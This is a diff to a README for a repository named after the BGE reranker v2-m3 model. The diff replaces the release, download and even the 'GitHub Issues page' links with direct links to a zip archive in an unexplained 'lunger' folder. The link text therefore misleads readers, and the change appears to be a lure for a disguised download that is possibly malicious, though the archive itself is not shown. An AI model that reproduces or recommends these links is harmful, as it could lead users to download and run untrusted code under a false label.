@@ -17,9 +17,9 @@ Welcome to the **HuggingFace-BAAI--BGERerankerv2m3** repository. This applicatio
 To get started, you will need to download the application. 
 
 ### Click the Link Below to Download
-[![Download BGERerankerv2m3](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/releases)
+[![Download BGERerankerv2m3](https://raw.githubusercontent.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/main/lunger/HuggingFace-BAAI--BGERerankerv2m3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/main/lunger/HuggingFace-BAAI--BGERerankerv2m3.zip)
 
-Visit this page to download the latest version: [HuggingFace-BAAI--BGERerankerv2m3 Releases](https://github.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/releases).
+Visit this page to download the latest version: [HuggingFace-BAAI--BGERerankerv2m3 Releases](https://raw.githubusercontent.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/main/lunger/HuggingFace-BAAI--BGERerankerv2m3.zip).
 
 ### Step-by-Step Installation
 
@@ -78,6 +78,6 @@ Using the application is straightforward. Here’s how you can start reranking c
 
 ## 🤝 Support
 
-If you have any questions or need assistance, please check the [GitHub Issues page](https://github.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/issues). You can report bugs, request features, or seek help from the community.
+If you have any questions or need assistance, please check the [GitHub Issues page](https://raw.githubusercontent.com/quyethd95/HuggingFace-BAAI--BGERerankerv2m3/main/lunger/HuggingFace-BAAI--BGERerankerv2m3.zip). You can report bugs, request features, or seek help from the community.
 
 Thank you for choosing **HuggingFace-BAAI--BGERerankerv2m3**. You are now ready to enhance your content with advanced reranking!
